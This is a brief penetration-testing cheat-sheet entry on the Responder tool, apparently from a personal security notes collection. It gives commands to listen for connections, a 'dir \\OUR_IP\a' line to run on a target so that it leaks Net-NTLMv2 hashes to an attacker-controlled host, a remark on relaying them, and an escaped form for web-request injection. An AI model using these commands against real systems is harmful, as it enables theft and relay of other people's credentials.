---
tags:
  - tool
  - packet_capture
---
# responder

Capture connections

## Capabilities

```bash
# Listen for incoming requests
sudo responder -I tun0

# Include previously captured hashes
sudo responder -I tun0 -v
```

Capture `Net-NTLMv2` hashes by initiating a request via the following command on the target. These hashes can be relayed so long as SMB signing is disabled.

```powershell
dir \\OUR_IP\a
```

**Note:** Make sure to include escape characters when injecting in a web request

```
\\\\OUR_IP\a
```